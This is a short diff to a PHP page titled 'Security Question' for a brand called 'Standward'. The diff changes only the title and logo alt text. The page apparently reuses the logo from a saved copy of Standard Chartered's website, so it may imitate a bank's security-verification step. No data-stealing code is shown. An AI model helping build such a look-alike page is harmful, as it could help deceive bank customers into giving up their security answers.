@@ -80,7 +80,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Question - Standward Credit</title>
+    <title>Security Question - Standward</title>
     <!-- Use existing styles -->
     <link rel="stylesheet" href="../assets/css/styles.css">
     <style>
@@ -174,7 +174,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <div class="logo">
             <!-- Adjust logo path if needed -->
             <img src="../Personal, Private and Corporate Banking _ Standard Chartered_files/Scb_logo.png"
-                alt="Standward Credit">
+                alt="Standward">
         </div>
 
         <h2>Security Verification</h2>
